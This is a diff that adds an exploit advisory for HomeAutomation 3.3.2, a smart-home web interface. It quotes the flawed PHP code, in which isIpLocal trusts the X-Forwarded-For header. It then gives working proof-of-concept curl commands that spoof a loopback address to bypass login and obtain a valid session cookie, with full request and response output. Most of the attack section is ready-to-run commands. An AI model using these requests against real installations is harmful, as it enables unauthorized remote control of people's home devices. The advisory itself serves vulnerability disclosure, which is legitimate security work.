@@ -1,0 +1,248 @@
+# Exploit: HomeAutomation 3.3.2 - Authentication Bypass
+# Date: 2019-12-30
+# Author: LiquidWorm
+# Vendor: Tom Rosenback and Daniel Malmgren
+# Product web page: http://karpero.mine.nu/ha/
+# Affected version: 3.3.2
+# Tested on: Apache/2.4.41 (centos) OpenSSL/1.0.2k-fips
+# Advisory ID: ZSL-2019-5557
+# Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2019-5557.php
+
+
+HomeAutomation v3.3.2 Authentication Bypass Exploit
+
+
+Vendor: Tom Rosenback and Daniel Malmgren
+Product web page: http://karpero.mine.nu/ha/
+Affected version: 3.3.2
+
+Summary: HomeAutomation is an open-source web interface and scheduling solution.
+It was initially made for use with the Telldus TellStick, but is now based on a
+plugin system and except for Tellstick it also comes with support for Crestron,
+OWFS and Z-Wave (using OpenZWave). It controls your devices (switches, dimmers,
+etc.) based on an advanced scheduling system, taking into account things like
+measurements from various sensors. With the houseplan view you can get a simple
+overview of the status of your devices at their location in your house.
+
+Desc: The application suffers from an authentication bypass vulnerability when
+spoofing client IP address using the X-Forwarded-For header with the local (loopback)
+IP address value allowing remote control of the smart home solution.
+
+===============================================================================
+/modules/login/login.module.php:
+--------------------------------
+19: if(!defined("HomeAutomationIncluded")) { die("HomeAutomation: Direct access not premitted"); }
+20:
+21: if($_SESSION[CFG_SESSION_KEY]["userlevel"] < 1 && $action == "default" && isIpLocal() && getFormVariable("autologin", "") == "")
+22: {
+23:         // if user is not logged in and action is default, user is visiting locally and autologin is NOT set, allow autologin.
+24:         $action = "login";
+25: }
+26:
+27: ?>
+
+===============================================================================
+/functions.php:
+---------------
+733: function isIpLocal() {
+734: 
+735: 	if(substr(getIpAddress(), 0, 4) == "127.") {
+736: 		return true;
+737: 	}
+738: 
+739: 	$isIpLocal = false;
+740: 
+741: 	$localip = $_SESSION[CFG_SESSION_KEY]["settings"]["localip"];
+742: 
+743: 	$localnets = explode(";", $localip);
+744: 	foreach($localnets as $localnet) {
+745: 		list($localnet, $localmask) = explode("/", $localnet);
+746: 		if($localmask == "") {
+747: 			$localmask = 32;
+748: 		}
+749: 		if($localmask == "" || $localmask > 32 || $localmask < 0) {
+750: 			$localmask = 32;
+751: 		}
+752: 
+753: 		// $mask = $localmask;
+754: 
+755: 		$localnet = ip2long($localnet);
+756: 		$localmask = ~((1 << (32-$localmask)) - 1);
+757: 		$remoteip = ip2long(getIpAddress());
+758: 		$maskedip = $remoteip & $localmask;
+759: 		$maskednet = $localnet & $localmask;
+760: 
+761: 		// echo "<br />localnet:";
+762: 		// printf('%1$32b', $localnet);
+763: 
+764: 		// echo "<br />localmask: (dec: ".$mask.")";
+765: 		// printf('%1$32b', $localmask);
+766: 
+767: 		// echo "<br />remoteip:";
+768: 		// printf('%1$32b', $remoteip);
+769: 
+770: 		// echo "<br />maskedip:";
+771: 		// printf('%1$32b', $maskedip);
+772: 
+773: 		// echo "<br />maskednet:";
+774: 		// printf('%1$32b', $maskednet);
+775: 
+776: 		if($maskedip == $maskednet) {
+777: 			// echo "<br />maskedip == maskednet";
+778: 			$isIpLocal = true;
+779: 			break;
+780: 		}
+781: 	}
+782: 	// $isIpLocal = false;
+783: 	return $isIpLocal;
+784: }
+785: 
+786: function getIpAddress() {
+787: 	return isset($_SERVER["HTTP_X_FORWARDED_FOR"]) ? $_SERVER["HTTP_X_FORWARDED_FOR"] : $_SERVER["REMOTE_ADDR"];
+788: }
+===============================================================================
+
+Tested on: Apache/2.4.41 (centos) OpenSSL/1.0.2k-fips
+           Apache/2.4.29 (Ubuntu)
+           PHP/7.4.0RC4
+           PHP/7.3.11
+           PHP 7.2.24-0ubuntu0.18.04.1
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2019-5557
+Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2019-5557.php
+
+
+06.11.2019
+
+--
+
+
+PoC auth bypass and arbitrary cookie setup grepping auth'd content view:
+------------------------------------------------------------------------
+
+root@kali:~/homeautomation# curl -sk --user-agent "ZSL/0.2 (SpoofDetect 1.0)" https://192.168.2.113/index.php -H "X-Forwarded-For: 127.31.33.7" -vL --cookie "PHPSESSID=11111111110000000000666666" |grep Macros
+*   Trying 192.168.2.113...
+* Connected to 192.168.2.113 (192.168.2.113) port 443 (#0)
+* found 173 certificates in /etc/ssl/certs/ca-certificates.crt
+* found 696 certificates in /etc/ssl/certs
+* ALPN, offering h2
+* ALPN, offering http/1.1
+* SSL connection using TLS1.2 / ECDHE_RSA_AES_128_GCM_SHA256
+* 	 server certificate verification SKIPPED
+* 	 server certificate status verification SKIPPED
+* 	 common name: n28.nux.se (does not match '192.168.2.113')
+* 	 server certificate expiration date OK
+* 	 server certificate activation date OK
+* 	 certificate public key: RSA
+* 	 certificate version: #3
+* 	 subject: CN=n28.nux.se
+* 	 start date: Mon, 21 Oct 2019 12:18:27 GMT
+* 	 expire date: Sun, 19 Jan 2020 12:18:27 GMT
+* 	 issuer: C=US,O=Let's Encrypt,CN=Let's Encrypt Authority X3
+* 	 compression: NULL
+* ALPN, server accepted to use http/1.1
+> GET /index.php HTTP/1.1
+> Host: 192.168.2.113
+> User-Agent: ZSL/0.2 (SpoofDetect 1.0)
+> Accept: */*
+> Cookie: PHPSESSID=11111111110000000000666666
+> X-Forwarded-For: 127.31.33.7
+> 
+< HTTP/1.1 303 See Other
+< Date: Wed, 20 Nov 2019 01:06:16 GMT
+< Server: Apache/2.4.41 (centos) OpenSSL/1.0.2k-fips
+< X-Powered-By: PHP/7.3.11
+< Expires: Thu, 19 Nov 1981 08:52:00 GMT
+< Cache-Control: no-store, no-cache, must-revalidate
+< Pragma: no-cache
+< Strict-Transport-Security: max-age=63072000; includeSubdomains
+< X-Frame-Options: DENY
+< X-Content-Type-Options: nosniff
+< Location: ./index.php?page=houseplan
+< Content-Length: 0
+< Content-Type: text/html; charset=UTF-8
+< 
+* Connection #0 to host 192.168.2.113 left intact
+* Issue another request to this URL: 'https://192.168.2.113/index.php?page=houseplan'
+* Found bundle for host 192.168.2.113: 0x55c160ef7c40 [can pipeline]
+* Re-using existing connection! (#0) with host 192.168.2.113
+* Connected to 192.168.2.113 (192.168.2.113) port 443 (#0)
+> GET /index.php?page=houseplan HTTP/1.1
+> Host: 192.168.2.113
+> User-Agent: ZSL/0.2 (SpoofDetect 1.0)
+> Accept: */*
+> Cookie: PHPSESSID=11111111110000000000666666
+> X-Forwarded-For: 127.31.33.7
+> 
+< HTTP/1.1 200 OK
+< Date: Wed, 20 Nov 2019 01:06:16 GMT
+< Server: Apache/2.4.41 (centos) OpenSSL/1.0.2k-fips
+< X-Powered-By: PHP/7.3.11
+< Expires: Thu, 19 Nov 1981 08:52:00 GMT
+< Cache-Control: no-store, no-cache, must-revalidate
+< Pragma: no-cache
+< Strict-Transport-Security: max-age=63072000; includeSubdomains
+< X-Frame-Options: DENY
+< X-Content-Type-Options: nosniff
+< Transfer-Encoding: chunked
+< Content-Type: text/html; charset=UTF-8
+< 
+{ [6 bytes data]
+*							</li><li>| <a href="./index.php?page=macros">Macros</a>
+ Connection #0 to host 192.168.2.113 left intact
+root@kali:~/homeautomation# curl -sk --user-agent "ZSL/0.2 (SpoofDetect 1.0)" https://192.168.2.113/index.php -vL --cookie "PHPSESSID=11111111110000000000666666" |grep Macros
+*   Trying 192.168.2.113...
+* Connected to 192.168.2.113 (192.168.2.113) port 443 (#0)
+* found 173 certificates in /etc/ssl/certs/ca-certificates.crt
+* found 696 certificates in /etc/ssl/certs
+* ALPN, offering h2
+* ALPN, offering http/1.1
+* SSL connection using TLS1.2 / ECDHE_RSA_AES_128_GCM_SHA256
+* 	 server certificate verification SKIPPED
+* 	 server certificate status verification SKIPPED
+* 	 common name: n28.nux.se (does not match '192.168.2.113')
+* 	 server certificate expiration date OK
+* 	 server certificate activation date OK
+* 	 certificate public key: RSA
+* 	 certificate version: #3
+* 	 subject: CN=n28.nux.se
+* 	 start date: Mon, 21 Oct 2019 12:18:27 GMT
+* 	 expire date: Sun, 19 Jan 2020 12:18:27 GMT
+* 	 issuer: C=US,O=Let's Encrypt,CN=Let's Encrypt Authority X3
+* 	 compression: NULL
+* ALPN, server accepted to use http/1.1
+> GET /index.php HTTP/1.1
+> Host: 192.168.2.113
+> User-Agent: ZSL/0.2 (SpoofDetect 1.0)
+> Accept: */*
+> Cookie: PHPSESSID=11111111110000000000666666
+> 
+< HTTP/1.1 200 OK
+< Date: Wed, 20 Nov 2019 01:06:25 GMT
+< Server: Apache/2.4.41 (centos) OpenSSL/1.0.2k-fips
+< X-Powered-By: PHP/7.3.11
+< Expires: Thu, 19 Nov 1981 08:52:00 GMT
+< Cache-Control: no-store, no-cache, must-revalidate
+< Pragma: no-cache
+< Strict-Transport-Security: max-age=63072000; includeSubdomains
+< X-Frame-Options: DENY
+< X-Content-Type-Options: nosniff
+< Transfer-Encoding: chunked
+< Content-Type: text/html; charset=UTF-8
+< 
+{ [6 bytes data]
+							</li><li>| <a href="./index.php?page=macros">Macros</a>
+* Connection #0 to host 192.168.2.113 left intact
+root@kali:~/homeautomation# 
+
+
+PoC auth bypass retrieving valid Cookie:
+-----------------------------------------
+
+root@kali:~/homeautomation# $(curl -sk --user-agent "ZSL/0.2 (SpoofDetect 1.0)" https://192.168.2.113/?page=houseplan -L -H "X-Forwarded-For: 127.1.1.1" --cookie-jar cookies.txt -o /dev/null) ; echo -ne "Your cookie: " ;tail -c -27 cookies.txt
+Your cookie: k4dic6crpr4d4u71tr13gvtmsv
